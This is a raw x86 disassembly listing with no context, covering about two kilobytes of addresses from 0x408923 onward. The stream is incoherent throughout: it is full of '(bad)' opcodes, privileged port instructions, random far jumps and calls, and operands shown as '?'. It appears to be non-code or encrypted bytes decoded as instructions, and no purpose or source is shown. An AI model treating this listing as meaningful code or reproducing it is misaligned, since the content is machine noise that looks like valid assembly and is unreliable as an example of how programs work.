  408923:	lahf   
  408924:	nop
  408925:	cmp    BYTE PTR [ecx-0x5c],0xd1
  408929:	mov    esp,0x53879f2e
  40892e:	and    al,0xc7
  408930:	das    
  408931:	xor    eax,0xca6815a3
  408936:	test   DWORD PTR [edi-0x33d9565],edi
  40893c:	mov    dh,0x63
  40893e:	rcr    ecx,0xa4
  408941:	call   0x96abbbe2
  408946:	dec    edi
  408947:	or     DWORD PTR [ebx],esp
  408949:	mov    eax,ds:0xa3f91324
  40894e:	enter  0x93ae,0xed
  408952:	sti    
  408953:	repnz int 0x4c
  408956:	out    dx,al
  408957:	fild   QWORD PTR [esi-0x20]
  40895a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40895b:	in     al,0x8e
  40895d:	es fst st(5)
  408960:	and    DWORD PTR [esi+edi*4+0x3d0512],eax
  408967:	mov    ecx,0xe29eba
  40896c:	add    bl,BYTE PTR [eax]
  40896e:	pop    es
  40896f:	mov    bl,0x90
  408971:	out    0x53,eax
  408973:	and    al,0xc1
  408975:	dec    cx
  408977:	inc    edx
  408978:	push   cs
  408979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40897a:	sub    ch,BYTE PTR [ebx+0x6f]
  40897d:	mov    eax,ds:0x116ac289
  408982:	mov    esp,DWORD PTR [esi]
  408984:	ja     0x408952
  408986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408987:	xor    BYTE PTR [edx],cl
  408989:	aad    0xe7
  40898b:	add    eax,0xc3883330
  408990:	mov    cl,0xdd
  408992:	in     eax,0x7d
  408994:	ins    BYTE PTR es:[edi],dx
  408995:	xor    eax,0x80d872f9
  40899a:	sub    al,0x9f
  40899c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40899d:	arpl   WORD PTR [esi+edi*4],sp
  4089a0:	inc    edx
  4089a1:	sti    
  4089a2:	(bad)  
  4089a3:	or     BYTE PTR [eax+0x5a4857f9],cl
  4089a9:	dec    esi
  4089aa:	sbb    edx,DWORD PTR [edx-0x15]
  4089ad:	dec    eax
  4089ae:	and    al,0x56
  4089b0:	xchg   BYTE PTR [edx],dl
  4089b2:	push   cs
  4089b3:	fs cmp ah,cl
  4089b6:	push   ebx
  4089b7:	mov    ecx,0xd0ebcc04
  4089bc:	mov    ah,0xec
  4089be:	xchg   ecx,eax
  4089bf:	sbb    ah,BYTE PTR es:[esi+0x53]
  4089c3:	pop    edi
  4089c4:	je     0x40899c
  4089c6:	cmp    DWORD PTR [ebp+0x1e],0xe77bc047
  4089cd:	xor    esi,eax
  4089cf:	xchg   esi,eax
  4089d0:	in     eax,dx
  4089d1:	ds (bad) 
  4089d3:	adc    edx,DWORD PTR [edi-0x73a33111]
  4089d9:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4089db:	dec    ebp
  4089dc:	inc    esi
  4089dd:	sbb    eax,0x8298dfd8
  4089e2:	es push ebp
  4089e4:	rcl    edx,cl
  4089e6:	inc    eax
  4089e7:	jae    0x4089a8
  4089e9:	cmp    BYTE PTR [ebp+0x16],ch
  4089ec:	dec    edx
  4089ed:	or     DWORD PTR [edx],edx
  4089ef:	xlat   BYTE PTR ds:[ebx]
  4089f0:	push   eax
  4089f1:	cld    
  4089f2:	mov    DWORD PTR [ebp-0x17c876f3],esp
  4089f8:	outs   dx,BYTE PTR ds:[esi]
  4089f9:	xchg   edx,eax
  4089fa:	pop    esp
  4089fb:	in     eax,dx
  4089fc:	test   DWORD PTR [edx+ebp*1],esp
  4089ff:	mov    cl,0xe4
  408a01:	(bad)  
  408a02:	int3   
  408a03:	and    al,0x90
  408a05:	adc    BYTE PTR [ebx],al
  408a07:	out    0xd7,al
  408a09:	jo     0x408a7f
  408a0b:	adc    eax,0xc2f90e3
  408a10:	jmp    0x4b00:0x178cdc2c
  408a17:	(bad)  
  408a18:	adc    DWORD PTR [edx],esp
  408a1a:	jge    0x408a59
  408a1c:	jne    0x408a1b
  408a1e:	pop    ds
  408a1f:	dec    ebp
  408a20:	jbe    0x408a13
  408a22:	shl    DWORD PTR [ecx],1
  408a24:	loopne 0x408a72
  408a26:	in     eax,0xb0
  408a28:	ret    0xb426
  408a2b:	sti    
  408a2c:	lahf   
  408a2d:	ret    0x87ff
  408a30:	out    dx,eax
  408a31:	push   0xaca018a3
  408a36:	xchg   ebp,eax
  408a37:	pop    eax
  408a38:	test   eax,0x12d56147
  408a3d:	push   edx
  408a3e:	push   esp
  408a3f:	inc    ebx
  408a40:	and    BYTE PTR [ecx+0x51],al
  408a43:	mov    ds:0x92bc9137,al
  408a48:	loope  0x408a17
  408a4a:	std    
  408a4b:	inc    ecx
  408a4c:	adc    DWORD PTR [ecx-0x2a],eax
  408a4f:	fdiv   DWORD PTR ds:0x1697aa07
  408a55:	imul   edx,DWORD PTR [ebx-0x4e],0x2123ab8e
  408a5c:	or     al,0xe4
  408a5e:	shl    BYTE PTR [esi-0x31],0x97
  408a62:	data16 cli 
  408a64:	jne    0x408a75
  408a66:	mov    ds:0x8ac574ae,eax
  408a6b:	jb     0x408a98
  408a6d:	pop    ecx
  408a6e:	out    dx,eax
  408a6f:	fdiv   st,st(4)
  408a71:	ret    
  408a72:	mov    dl,0xf4
  408a74:	shr    DWORD PTR [eax],cl
  408a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a77:	dec    eax
  408a78:	clc    
  408a79:	inc    ebx
  408a7a:	aad    0x7
  408a7c:	out    dx,al
  408a7d:	inc    ebx
  408a7e:	repnz sbb DWORD PTR [eax],0x779c7004
  408a85:	dec    esi
  408a86:	scas   eax,DWORD PTR es:[edi]
  408a87:	mov    ah,0x83
  408a89:	cli    
  408a8a:	cmc    
  408a8b:	pusha  
  408a8c:	sbb    al,0x39
  408a8e:	push   esp
  408a8f:	pop    edi
  408a90:	pop    ebp
  408a91:	xchg   edi,eax
  408a92:	imul   esi,DWORD PTR [edx-0x66c926f9],0xffffffc8
  408a99:	mov    ds:0xd19b681d,eax
  408a9e:	ror    BYTE PTR [ebp+0x63],cl
  408aa1:	out    dx,al
  408aa2:	jns    0x408a4b
  408aa4:	mov    dh,0x3a
  408aa6:	retf   0xbd89
  408aa9:	fstp   TBYTE PTR [eax]
  408aab:	jle    0x408adf
  408aad:	cmp    BYTE PTR [esi+0xd26728d],0x6f
  408ab4:	fcmovnu st,st(6)
  408ab6:	loope  0x408ac2
  408ab8:	add    esi,DWORD PTR [ebp-0x7bf60272]
  408abe:	mov    edi,0x96cb658e
  408ac3:	ss adc eax,0x73f27614
  408ac9:	test   al,0x2e
  408acb:	dec    esi
  408acc:	sbb    DWORD PTR [edi+ebx*1-0x46],esi
  408ad0:	or     al,0x1a
  408ad2:	xchg   DWORD PTR [edx+0x1ae9d495],edx
  408ad8:	mov    ?,WORD PTR [edi]
  408ada:	fld    TBYTE PTR [esi]
  408adc:	xchg   esi,eax
  408add:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ade:	mov    ds:0xda22b488,eax
  408ae3:	adc    eax,0x469dd3cb
  408ae8:	mov    ebx,0xbd87680c
  408aed:	inc    ebp
  408aee:	cs enter 0x4e9,0x9b
  408af3:	mov    ds:0x68df4d91,al
  408af8:	repz mov ds:0x70bd0d10,eax
  408afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aff:	ror    DWORD PTR [ecx],1
  408b01:	mov    al,BYTE PTR [ebx-0x7]
  408b04:	shl    BYTE PTR [esi+0x99cff25],cl
  408b0a:	sub    eax,0xa4743d4a
  408b0f:	retf   0xefff
  408b12:	pop    esp
  408b13:	(bad)  
  408b14:	cmp    ebx,DWORD PTR [edx-0x1f1de41d]
  408b1a:	push   eax
  408b1b:	add    eax,0xca25d0f7
  408b20:	jecxz  0x408b29
  408b22:	ins    DWORD PTR es:[edi],dx
  408b23:	xchg   ebp,eax
  408b24:	ds test dh,dl
  408b27:	pop    es
  408b28:	jecxz  0x408b20
  408b2a:	ret    
  408b2b:	scas   eax,DWORD PTR es:[edi]
  408b2c:	ja     0x408b83
  408b2e:	sahf   
  408b2f:	cmp    al,0x95
  408b31:	inc    esp
  408b32:	cli    
  408b33:	cli    
  408b34:	push   edx
  408b35:	test   al,0x24
  408b37:	sub    DWORD PTR [edx-0x29],ebp
  408b3a:	repnz inc edx
  408b3c:	scas   al,BYTE PTR es:[edi]
  408b3d:	mov    eax,DWORD PTR [esi-0x15]
  408b40:	int    0xca
  408b42:	and    eax,0xaa3b88ac
  408b47:	dec    edi
  408b48:	dec    ebx
  408b4a:	out    0x93,al
  408b4c:	sbb    eax,0x78d29aad
  408b51:	push   ecx
  408b52:	fmul   QWORD PTR [ebx+edi*2+0x15d86530]
  408b59:	sar    esp,0x59
  408b5c:	or     eax,0x600eb7eb
  408b61:	ret    0x300a
  408b64:	fsubr  DWORD PTR [esi+0xc91a3b0]
  408b6a:	repz mov al,ds:0xb2898dea
  408b70:	jbe    0x408b27
  408b72:	(bad)  
  408b73:	mov    ah,0x35
  408b75:	mov    ch,0xf5
  408b77:	sbb    DWORD PTR [ebx+esi*1],edx
  408b7a:	int    0x47
  408b7c:	cmp    al,0x53
  408b7e:	in     eax,0xe9
  408b80:	aam    0x62
  408b82:	sub    edx,eax
  408b84:	pop    esp
  408b85:	inc    ebx
  408b86:	mov    es,WORD PTR [ecx]
  408b88:	lock into 
  408b8a:	data16 ss fwait
  408b8d:	sub    eax,0x739cea1c
  408b92:	mov    cl,0xe4
  408b94:	inc    esp
  408b95:	mov    ch,0xcc
  408b97:	push   cs
  408b98:	push   0x86a2cae2
  408b9d:	js     0x408b4f
  408b9f:	add    DWORD PTR [edx-0x24],edx
  408ba2:	fs inc eax
  408ba4:	dec    ebx
  408ba5:	add    esp,edx
  408ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ba9:	mov    esi,0xc2d7d02d
  408bae:	pop    ebp
  408baf:	stos   DWORD PTR es:[edi],eax
  408bb0:	js     0x408b82
  408bb2:	mov    ah,BYTE PTR [edx+0x19]
  408bb5:	fwait
  408bb6:	cmp    eax,0xc0a95e10
  408bbb:	lahf   
  408bbc:	addr16 push esi
  408bbe:	jmp    0x36f:0xa32efbde
  408bc5:	int    0xbe
  408bc7:	mov    ebp,0x78de4ab6
  408bcc:	dec    edx
  408bcd:	or     BYTE PTR [ecx],0xbb
  408bd0:	sub    DWORD PTR [edx-0x7d],esp
  408bd3:	aad    0x76
  408bd5:	repnz push 0xffffff85
  408bd8:	cmp    esi,esi
  408bda:	and    BYTE PTR ds:0x4cbb44d3,al
  408be0:	in     eax,dx
  408be1:	aaa    
  408be2:	sbb    al,0x9a
  408be4:	jmp    0xd761:0xff5cd34d
  408beb:	cli    
  408bec:	inc    edx
  408bed:	ret    0x1fdd
  408bf0:	sbb    al,0xc4
  408bf2:	dec    edi
  408bf3:	sti    
  408bf4:	bound  ebp,QWORD PTR ds:0xde7ed784
  408bfa:	inc    ecx
  408bfb:	sub    eax,0xfeda1fa5
  408c00:	jecxz  0x408c60
  408c02:	mov    eax,0x19a8b74e
  408c07:	dec    edi
  408c08:	xchg   esp,eax
  408c09:	iret   
  408c0a:	int3   
  408c0b:	fild   WORD PTR [ebp-0x68]
  408c0e:	js     0x408bef
  408c10:	(bad)  
  408c11:	cmp    eax,0xff8282b1
  408c16:	stc    
  408c17:	pushf  
  408c18:	das    
  408c19:	push   ebx
  408c1a:	(bad)  
  408c1b:	outs   dx,DWORD PTR ds:[esi]
  408c1c:	pop    ecx
  408c1d:	fisubr DWORD PTR [esp+edx*4+0x1f]
  408c21:	jb     0x408c9c
  408c23:	adc    BYTE PTR [edi-0x1f3fe478],0x86
  408c2a:	inc    edi
  408c2b:	sbb    al,BYTE PTR [esp+ebp*2+0x177dd9bd]
  408c32:	sub    BYTE PTR [ecx],bl
  408c34:	test   DWORD PTR [ebx],ebx
  408c36:	data16 out dx,al
  408c38:	push   es
  408c39:	scas   eax,DWORD PTR es:[edi]
  408c3a:	lods   al,BYTE PTR ds:[esi]
  408c3b:	adc    ebx,ecx
  408c3d:	jle    0x408c38
  408c3f:	retf   
  408c40:	shr    BYTE PTR [esi],0x50
  408c43:	shr    BYTE PTR [edx-0x129d3dd1],1
  408c49:	inc    edi
  408c4a:	clc    
  408c4b:	into   
  408c4c:	xchg   ebx,eax
  408c4d:	call   0xcd64:0xb2dea2cc
  408c54:	int    0xb0
  408c56:	es push ebp
  408c58:	das    
  408c59:	xchg   esi,eax
  408c5a:	or     DWORD PTR [esi-0x2e],edx
  408c5d:	outs   dx,DWORD PTR ds:[esi]
  408c5e:	xchg   edx,eax
  408c5f:	xor    ebx,ecx
  408c61:	mov    esp,0x70af74e6
  408c66:	add    eax,0xb8a845dd
  408c6b:	repz or BYTE PTR [ebx+0x6a01c1aa],dl
  408c72:	aad    0x39
  408c74:	jnp    0x408c45
  408c76:	aad    0x3a
  408c78:	pop    ss
  408c79:	inc    edi
  408c7a:	push   ebp
  408c7b:	mov    eax,0x18cbd434
  408c80:	jge    0x408c93
  408c82:	mov    ?,WORD PTR gs:[ebp-0x73]
  408c86:	retf   0x7d62
  408c89:	out    0xc4,al
  408c8b:	fimul  DWORD PTR [ebx-0x592fe3a1]
  408c91:	sub    BYTE PTR [edi+edi*4],dh
  408c94:	nop
  408c95:	sar    BYTE PTR [eax-0x7c396f7b],cl
  408c9b:	ror    DWORD PTR [ebx-0x76],1
  408c9e:	fldenv [edi]
  408ca0:	jle    0x408d13
  408ca2:	sub    al,0x41
  408ca4:	loope  0x408ca5
  408ca6:	retf   
  408ca7:	cmp    eax,0x35040de3
  408cac:	sahf   
  408cad:	mov    BYTE PTR [eax],al
  408caf:	(bad)  
  408cb0:	xor    ebp,DWORD PTR gs:[esi+0x2c]
  408cb4:	leave  
  408cb5:	cmp    edi,DWORD PTR gs:[edx+0x7b2b726f]
  408cbc:	and    dl,BYTE PTR [ecx+0x78]
  408cbf:	sub    al,0x7
  408cc1:	pop    ebx
  408cc2:	cmp    al,0xd1
  408cc4:	sbb    eax,0x7fe43d33
  408cc9:	scas   al,BYTE PTR es:[edi]
  408cca:	jp     0x408c5e
  408ccc:	inc    esp
  408ccd:	inc    ebp
  408cce:	(bad)  
  408ccf:	mov    dl,0x8c
  408cd1:	dec    ebx
  408cd2:	out    0xfe,eax
  408cd4:	test   al,dl
  408cd6:	in     eax,dx
  408cd7:	leave  
  408cd8:	cld    
  408cd9:	cdq    
  408cda:	ss in  al,0xec
  408cdd:	jbe    0x408cea
  408cdf:	mov    ds:0xb1fb33b7,al
  408ce4:	lea    esi,[ebp-0x79]
  408ce7:	fstp   TBYTE PTR [esi]
  408ce9:	xor    al,0xe6
  408cec:	pushf  
  408ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cee:	cmp    al,0x71
  408cf0:	enter  0xea7a,0x42
  408cf4:	iret   
  408cf5:	jecxz  0x408d11
  408cf7:	out    0xee,eax
  408cf9:	cmp    eax,0xdd1b243e
  408cfe:	ret    0x7e32
  408d01:	daa    
  408d02:	lods   al,BYTE PTR ds:[esi]
  408d03:	jae    0x408d82
  408d05:	rcl    DWORD PTR [edi-0x4f],0x5f
  408d09:	push   eax
  408d0a:	xor    al,0x22
  408d0c:	cmp    ebp,DWORD PTR [edi]
  408d0e:	mov    BYTE PTR [edi-0x200cd232],ch
  408d14:	out    dx,eax
  408d15:	lods   eax,DWORD PTR ds:[esi]
  408d16:	in     al,0x17
  408d18:	std    
  408d19:	repz xchg edi,eax
  408d1b:	pop    ss
  408d1c:	inc    edi
  408d1d:	sar    ch,cl
  408d1f:	cld    
  408d20:	ja     0x408d85
  408d22:	es pop ebx
  408d24:	push   ebp
  408d25:	sub    DWORD PTR [ebx+0x3f],ebx
  408d28:	imul   eax,DWORD PTR es:[ebx-0x689bab5e],0xb92f011f
  408d33:	out    0xbf,al
  408d35:	mov    ds:0xc80121ef,eax
  408d3a:	cwde   
  408d3b:	jge    0x408ccd
  408d3d:	and    eax,esp
  408d3f:	sti    
  408d40:	jmp    0x4ec1:0xf511a30c
  408d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d48:	jnp    0x408d63
  408d4a:	addr16 in al,dx
  408d4c:	mov    edi,0xdb8163c1
  408d51:	sbb    edi,ecx
  408d53:	mov    ds:0x456b1334,eax
  408d58:	adc    ebp,DWORD PTR [eax+0x1bfdc14f]
  408d5e:	hlt    
  408d5f:	cwde   
  408d60:	test   al,0xad
  408d62:	xchg   esp,eax
  408d63:	sbb    ch,BYTE PTR [edx]
  408d65:	pop    edi
  408d66:	clc    
  408d67:	inc    ecx
  408d68:	test   ebx,edx
  408d6a:	(bad)  
  408d6c:	xor    DWORD PTR [ebp-0x2808ec1e],ebx
  408d72:	mov    cl,0x1a
  408d74:	dec    ecx
  408d75:	fstp   DWORD PTR [esi+0x3f]
  408d78:	jo     0x408d1c
  408d7a:	inc    ebx
  408d7b:	mov    al,BYTE PTR [edx-0x5ac0c627]
  408d81:	xor    DWORD PTR [ecx],ecx
  408d83:	push   ebx
  408d84:	push   0xffffffa4
  408d86:	xor    BYTE PTR ds:0x4d548f38,ch
  408d8c:	cwde   
  408d8d:	lea    esp,[esi]
  408d8f:	fcmovbe st,st(6)
  408d91:	popf   
  408d92:	mov    eax,ds:0xd89a62bf
  408d97:	out    dx,eax
  408d98:	dec    ebx
  408d99:	out    dx,eax
  408d9a:	pop    edx
  408d9b:	repnz mov dh,0x35
  408d9e:	xchg   esp,eax
  408d9f:	idiv   DWORD PTR [ecx]
  408da1:	dec    eax
  408da2:	add    eax,0xcb0890b0
  408da7:	dec    esp
  408da8:	mov    ebx,0x54064135
  408dad:	adc    DWORD PTR [esi],ebx
  408daf:	sub    DWORD PTR [esp+esi*4],ebp
  408db2:	and    eax,eax
  408db4:	push   ebp
  408db5:	pop    esp
  408db6:	mov    al,0xef
  408db8:	push   0xfffffffe
  408dba:	aam    0xfe
  408dbc:	call   0xf639134f
  408dc1:	and    al,0xf7
  408dc3:	sub    edi,DWORD PTR [ecx]
  408dc5:	jle    0x408d4f
  408dc7:	test   BYTE PTR [eax-0x5ef32998],al
  408dcd:	xchg   edx,eax
  408dce:	xchg   ecx,eax
  408dcf:	mov    al,0x3b
  408dd1:	cmp    eax,0xb6b4c164
  408dd6:	mov    eax,ds:0x703695a4
  408ddb:	(bad)  
  408ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ddd:	(bad)  
  408dde:	xchg   esp,eax
  408ddf:	outs   dx,BYTE PTR ds:[esi]
  408de0:	push   esi
  408de1:	xlat   BYTE PTR ds:[ebx]
  408de2:	ds mov dl,0xcd
  408de5:	in     al,0x2f
  408de7:	push   ecx
  408de8:	fwait
  408de9:	ds sub eax,0x382ede9e
  408def:	xchg   esi,eax
  408df0:	mov    WORD PTR [ecx],?
  408df2:	mov    dh,0x42
  408df4:	and    bl,BYTE PTR [ebx]
  408df6:	sub    ch,BYTE PTR [esi+0x2cf674bc]
  408dfc:	pop    ebp
  408dfd:	inc    edi
  408dfe:	mov    bh,0x46
  408e00:	lea    eax,[eax+0x14290302]
  408e06:	jno    0x408d97
  408e08:	cmp    esp,esp
  408e0a:	rol    BYTE PTR [edi-0x31],0xe2
  408e0e:	mov    edi,0xb52ff47f
  408e13:	pop    ds
  408e14:	scas   al,BYTE PTR es:[edi]
  408e15:	pop    ebx
  408e16:	das    
  408e17:	repz mul cl
  408e1a:	mov    eax,0xfef8bf03
  408e1f:	aaa    
  408e20:	or     BYTE PTR [ecx+ecx*1-0xb],cl
  408e24:	jle    0x408e5d
  408e26:	imul   esp,DWORD PTR [ebp+0x72],0x25f12369
  408e2d:	jge    0x408e38
  408e2f:	rol    esi,1
  408e31:	mov    DWORD PTR [edx+0x2c],esp
  408e34:	(bad)  
  408e35:	jmp    0x408e01
  408e37:	mov    bh,0x7b
  408e39:	cmp    al,0x77
  408e3b:	inc    edx
  408e3c:	jmp    0x408e28
  408e3e:	mov    ds:0x6aad2957,eax
  408e43:	enter  0x7f8f,0x9d
  408e47:	mov    al,0x62
  408e49:	mov    ah,0x99
  408e4b:	dec    esp
  408e4c:	outs   dx,DWORD PTR ds:[esi]
  408e4d:	and    ch,BYTE PTR [eax+0x5f1019eb]
  408e53:	sub    dl,dl
  408e55:	pop    ecx
  408e56:	pushf  
  408e57:	es fwait
  408e59:	inc    ecx
  408e5a:	jmp    0x4690:0xc3a940db
  408e61:	inc    ebp
  408e62:	push   eax
  408e63:	cmp    dl,BYTE PTR [ecx+0x4c9e599e]
  408e69:	fimul  WORD PTR [ecx]
  408e6b:	xchg   bh,dh
  408e6d:	cld    
  408e6e:	std    
  408e6f:	mov    bh,0x6d
  408e71:	xchg   ebx,eax
  408e72:	sbb    esp,eax
  408e74:	sbb    al,BYTE PTR [ebp-0x7933ce5a]
  408e7a:	push   esi
  408e7b:	in     al,dx
  408e7c:	pusha  
  408e7d:	aam    0x48
  408e7f:	pop    ebp
  408e80:	les    esp,FWORD PTR fs:[ebp+0x2ae330da]
  408e87:	sbb    ebx,ebp
  408e89:	les    edx,FWORD PTR [edx]
  408e8b:	ficom  WORD PTR [ebx-0x64]
  408e8e:	bound  eax,QWORD PTR [eax+0x2d65b68a]
  408e94:	sub    BYTE PTR [ecx],ch
  408e96:	jb     0x408e57
  408e98:	adc    DWORD PTR [edx+0x58db95aa],ebx
  408e9e:	add    BYTE PTR [edi],al
  408ea0:	scas   eax,DWORD PTR es:[edi]
  408ea1:	jecxz  0x408e64
  408ea3:	mov    ah,0x3b
  408ea5:	mov    bl,BYTE PTR [eax]
  408ea7:	inc    ebp
  408ea8:	pop    ecx
  408ea9:	xor    DWORD PTR [edi-0x61],esi
  408eac:	in     al,dx
  408ead:	retf   
  408eae:	xor    BYTE PTR [ebp+edx*8+0xb523],cl
  408eb5:	pop    edi
  408eb6:	pop    eax
  408eb7:	rcr    DWORD PTR [edx+ebp*2+0x37e827a0],cl
  408ebe:	lock (bad) 
  408ec0:	shl    BYTE PTR [ebx-0x4d6942d],cl
  408ec6:	sbb    BYTE PTR [ebx],al
  408ec8:	cmc    
  408ec9:	push   0x56
  408ecb:	outs   dx,BYTE PTR cs:[esi]
  408ecd:	enter  0x2437,0x68
  408ed1:	adc    eax,0xf250a4a5
  408ed6:	jmp    0x408ef3
  408ed8:	js     0x408f06
  408eda:	ficom  DWORD PTR [edi-0x6d542567]
  408ee0:	dec    esp
  408ee1:	ins    DWORD PTR es:[edi],dx
  408ee2:	sub    DWORD PTR [ebx],esp
  408ee4:	cmp    ah,BYTE PTR [ecx-0xe]
  408ee7:	and    al,0xa7
  408ee9:	ret    
  408eea:	mov    bl,0x9d
  408eec:	inc    BYTE PTR [esi]
  408eee:	add    al,0x1b
  408ef0:	mov    edx,0x912e1984
  408ef5:	push   cs
  408ef6:	pop    ebp
  408ef7:	push   0x72
  408ef9:	mov    al,0x37
  408efb:	jge    0x408ec2
  408efd:	stos   DWORD PTR es:[edi],eax
  408efe:	(bad)  
  408f00:	icebp  
  408f01:	mov    bl,0x3e
  408f03:	mov    ds:0x995ef939,al
  408f08:	cmp    BYTE PTR [edx+0x3960d8e],ch
  408f0e:	inc    ebx
  408f0f:	cwde   
  408f10:	push   ebp
  408f11:	push   edx
  408f12:	adc    esi,esp
  408f14:	adc    al,0x38
  408f16:	add    eax,0x9b8eb579
  408f1b:	mov    edi,0x393a08b5
  408f20:	shr    BYTE PTR [esi-0xd8c7c85],cl
  408f26:	call   0xe4a98a56
  408f2b:	mov    eax,0xff71ac08
  408f30:	jl     0x408f98
  408f32:	jl     0x408f3c
  408f34:	mov    esp,0x56d26d5f
  408f39:	inc    esp
  408f3a:	(bad)  
  408f3c:	dec    edi
  408f3d:	in     eax,0x30
  408f3f:	retf   0x8451
  408f42:	stc    
  408f43:	ret    
  408f44:	shr    BYTE PTR [ebp+0xcd355f8],1
  408f4a:	stc    
  408f4b:	ins    DWORD PTR es:[edi],dx
  408f4c:	push   esp
  408f4d:	xchg   edx,eax
  408f4e:	cwde   
  408f4f:	out    0x7a,eax
  408f51:	adc    DWORD PTR [edi+eax*2-0x7],eax
  408f55:	jae    0x408fa3
  408f57:	stc    
  408f58:	add    al,0x4
  408f5a:	fld    DWORD PTR [esi-0x72]
  408f5d:	pusha  
  408f5e:	test   eax,0x1693cfd3
  408f63:	shl    BYTE PTR [ecx+0x77],0x5f
  408f67:	jmp    0x96c7e4b0
  408f6c:	xchg   edx,eax
  408f6d:	mov    al,0x64
  408f6f:	mov    ecx,0xf884b6f8
  408f74:	mov    DWORD PTR [edx],eax
  408f76:	sbb    eax,0x3d39a3c6
  408f7b:	bound  esi,QWORD PTR [ebx]
  408f7d:	imul   edi,esi,0x19
  408f80:	ins    DWORD PTR es:[edi],dx
  408f81:	aaa    
  408f82:	(bad)  
  408f83:	aad    0xbd
  408f85:	loopne 0x408feb
  408f87:	sub    al,0xf0
  408f89:	xchg   ebp,eax
  408f8a:	idiv   BYTE PTR [ebp-0x42b01d6e]
  408f90:	xchg   DWORD PTR [esi-0x36],ebx
  408f93:	dec    esp
  408f94:	stc    
  408f95:	in     eax,dx
  408f96:	jo     0x408f31
  408f98:	dec    ebp
  408f99:	ficom  DWORD PTR [edi]
  408f9b:	adc    dl,BYTE PTR [eax]
  408f9d:	pop    DWORD PTR [ebx+ebp*8-0x12]
  408fa1:	(bad)  
  408fa2:	retf   0x3d38
  408fa5:	dec    edx
  408fa6:	les    esp,FWORD PTR [esi-0x78]
  408fa9:	adc    DWORD PTR [ebx+edx*2-0x68],ebx
  408fad:	cld    
  408fae:	ins    DWORD PTR es:[edi],dx
  408faf:	and    bl,BYTE PTR [edx+0x0]
  408fb2:	mov    edx,0xa11017a9
  408fb7:	loop   0x408f90
  408fb9:	(bad)  
  408fba:	loop   0x408fed
  408fbc:	xchg   ecx,eax
  408fbd:	pop    eax
  408fbe:	test   DWORD PTR [ecx+0x5db993bf],ebp
  408fc4:	push   es
  408fc5:	call   0x8698:0x6a5b1b6a
  408fcc:	add    al,0x3f
  408fce:	ss push es
  408fd0:	pop    es
  408fd1:	aaa    
  408fd2:	fdiv   QWORD PTR [ebp+0x1f]
  408fd5:	xchg   esp,eax
  408fd6:	inc    ebp
  408fd7:	cwde   
  408fd8:	pop    edx
  408fd9:	pop    ecx
  408fda:	lock add eax,0xb9e08efa
  408fe0:	adc    BYTE PTR [eax],al
  408fe2:	mov    dl,0x23
  408fe4:	scas   eax,DWORD PTR es:[edi]
  408fe5:	jmp    FWORD PTR [edx]
  408fe7:	clc    
  408fe8:	mov    bl,0xec
  408fea:	cmp    eax,0x22f45523
  408fef:	fsub   QWORD PTR cs:[edi-0xd]
  408ff3:	push   es
  408ff4:	mov    ecx,0x4ce6f161
  408ff9:	mov    BYTE PTR [ebx-0xee8379b],ch
  408fff:	popa   
  409000:	pusha  
  409001:	push   0xaf3972a6
  409006:	push   eax
  409007:	mov    dl,0x3c
  409009:	mov    ch,0xde
  40900b:	jmp    0xfcd53d10
  409010:	clc    
  409011:	sub    BYTE PTR [edx],cl
  409013:	pop    es
  409014:	sbb    DWORD PTR [edx+ebp*2+0x3e0fcfca],ebp
  40901b:	jnp    0x409030
  40901d:	add    BYTE PTR [edi],al
  40901f:	sbb    BYTE PTR [edi+0x62236300],ch
  409025:	idiv   BYTE PTR [edx-0x2a]
  409028:	ins    DWORD PTR es:[edi],dx
  409029:	mov    edx,0xab062e09
  40902e:	sub    eax,0xcba24629
  409033:	(bad)  
  409035:	adc    cl,ah
  409037:	nop
  409038:	bound  eax,QWORD PTR [edi+0xd]
  40903b:	push   esi
  40903c:	push   ebp
  40903d:	mov    ch,0x7e
  40903f:	leave  
  409040:	mov    ds:0xf228a66e,al
  409045:	out    0xd4,eax
  409047:	jmp    0x40907a
  409049:	jle    0x409050
  40904b:	sbb    esi,DWORD PTR [ecx+0x79787d9d]
  409051:	cmp    BYTE PTR [ebx],cl
  409053:	inc    eax
  409054:	mov    al,ds:0x571b150e
  409059:	sub    esi,DWORD PTR [edx-0x4c]
  40905c:	sbb    bl,0xc3
  40905f:	lods   eax,DWORD PTR ds:[esi]
  409060:	dec    edi
  409061:	jmp    0x671f:0xece6b7b4
  409068:	sti    
  409069:	(bad)  
  40906a:	lods   eax,DWORD PTR ds:[esi]
  40906b:	pop    ecx
  40906c:	and    cl,dl
  40906e:	(bad)  
  40906f:	xlat   BYTE PTR ds:[ebx]
  409070:	jb     0x409027
  409072:	cmovg  edx,DWORD PTR [ebx-0x6b]
  409076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409077:	(bad)  
  409078:	into   
  409079:	mov    eax,ds:0xb966d265
  40907e:	in     eax,dx
  40907f:	jne    0x409055
  409081:	retf   0x60f6
  409084:	aas    
  409085:	ficom  WORD PTR [ebx-0x25c38d08]
  40908b:	mov    ebx,0xff99e789
  409090:	jge    0x409110
  409092:	popf   
  409093:	xor    DWORD PTR [esp+edi*2],0x54
  409097:	jge    0x409118
  409099:	cwde   
  40909a:	movntps XMMWORD PTR [ebx+0x5b],xmm3
  40909e:	cwde   
  40909f:	pop    ds
  4090a0:	in     eax,dx
  4090a1:	retf   0x99ea
  4090a4:	jg     0x4090b6
  4090a6:	cdq    
  4090a7:	fbstp  TBYTE PTR [ecx-0x742a1fde]
  4090ad:	dec    ecx
  4090ae:	aaa    
  4090af:	ror    ebx,1
  4090b1:	je     0x40904b
  4090b3:	sbb    edi,DWORD PTR [edx-0x59]
  4090b6:	retf   0xfe5c
  4090b9:	push   ebp
  4090ba:	mov    BYTE PTR [ebp-0x53],ah
  4090bd:	sbb    bh,BYTE PTR [ebx]
